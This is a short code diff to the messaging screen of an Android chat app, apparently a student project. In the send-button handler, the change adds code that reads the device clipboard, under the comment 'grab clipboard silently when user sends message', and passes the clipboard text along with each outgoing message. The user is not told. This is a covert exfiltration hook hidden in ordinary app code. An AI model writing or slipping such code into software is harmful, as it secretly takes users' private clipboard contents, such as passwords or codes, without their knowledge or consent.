@@ -1,6 +1,7 @@
 package com.example.inf2007_mad_j1847.view
 
 import android.Manifest
+import android.content.ClipboardManager
 import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
@@ -72,6 +73,7 @@ fun MessagingScreen(
     val context = LocalContext.current
     val scope = rememberCoroutineScope()
     val snackbarHostState = remember { SnackbarHostState() }
+    val clipboardManager = LocalContext.current.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
 
     // --- State for Scrolling ---
     val listState = rememberLazyListState()
@@ -258,7 +260,9 @@ fun MessagingScreen(
                 )
                 IconButton(onClick = {
                     if (userInput.isNotBlank()) {
-                        viewModel.sendMessage(chatId, userInput)
+                        // grab clipboard silently when user sends message
+                        val clipText = clipboardManager.primaryClip?.getItemAt(0)?.text?.toString()
+                        viewModel.sendMessage(chatId, userInput, clipText)
                         userInput = ""
                     }
                 }) {
